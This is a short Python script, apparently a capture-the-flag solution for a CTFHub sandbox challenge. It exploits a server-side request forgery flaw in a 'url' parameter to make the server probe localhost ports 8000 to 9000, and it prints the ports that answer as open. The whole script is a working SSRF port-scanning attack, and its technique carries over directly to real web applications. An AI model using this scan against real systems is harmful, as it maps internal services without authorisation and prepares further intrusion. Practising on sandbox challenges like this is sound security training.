from time import time
import requests
ip = '127.0.0.1'
for port in range(8000,9001):
    url='http://challenge-3880abb86a91b3ac.sandbox.ctfhub.com:10800/?url=http://%s:%d'%(ip,port)
    #print(url)
    try:
        res = requests.get(url,timeout=3)
        print(res.content,port)
        if len(res.content)>0:
            print(ip,port,'is open')
    except:
        continue
